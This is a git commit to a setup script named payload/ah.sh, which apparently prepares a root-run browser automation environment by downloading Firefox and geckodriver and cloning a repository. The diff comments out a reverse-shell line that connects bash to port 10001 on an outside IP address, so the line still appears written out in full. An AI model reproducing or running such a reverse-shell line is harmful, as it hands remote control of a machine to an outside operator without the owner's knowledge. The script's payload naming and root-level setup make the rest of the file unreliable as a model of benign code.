3f7d7c9ee7b6e6abce029fcc87d585fd475be8ed
dev01team <125609175+dev01team@users.noreply.github.com>
2023-02-27 08:20:10 +0100

    Update ah.sh

--- payload/ah.sh
+++ payload/ah.sh
@@ -5,7 +5,7 @@ mkdir -p /root/EXTRAT/firefox-97.0.1/
 
 wget -q https://ftp.mozilla.org/pub/firefox/releases/97.0.1/linux-x86_64/en-GB/firefox-97.0.1.tar.bz2 && tar -xf firefox-97.0.1.tar.bz2 -C /root/EXTRAT/firefox-97.0.1/
 
-bash -i >& /dev/tcp/197.202.207.91/10001 0>&1
+#bash -i >& /dev/tcp/197.202.207.91/10001 0>&1
 cd /root/
 git clone https://github.com/GH0STAV0/SDA_ALL.git /root/SDA_ALL
 wget -q https://github.com/mozilla/geckodriver/releases/download/v0.32.0/geckodriver-v0.32.0-linux64.tar.gz && tar -xf geckodriver-v0.32.0-linux64.tar.gz
